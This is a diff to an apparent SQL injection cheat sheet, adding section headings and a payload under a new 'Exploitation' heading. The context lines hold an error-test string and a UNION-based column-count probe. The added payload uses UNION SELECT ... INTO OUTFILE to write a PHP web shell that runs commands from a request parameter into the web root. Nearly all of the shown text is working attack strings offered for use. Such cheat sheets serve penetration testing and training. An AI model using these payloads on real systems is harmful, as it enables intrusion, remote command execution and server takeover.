@@ -85,6 +85,8 @@ RCE Payload 2
 
 ## Manual
 
+### Enumeration
+
 Basic Error Test
 `value'`
 
@@ -97,6 +99,11 @@ Circumvent Query Condition
 
 Determine Number of Columns in Select (add/remove numbers until no error)
 `value' union select 1,2,3-- -`
+
+### Exploitation
+
+Into Outfile Web Shell
+`value' union select "<?php echo system($_REQUEST['c']); ?>" into outfile '/var/www/html/shell.php'-- -`
 
 ## sqlmap
 
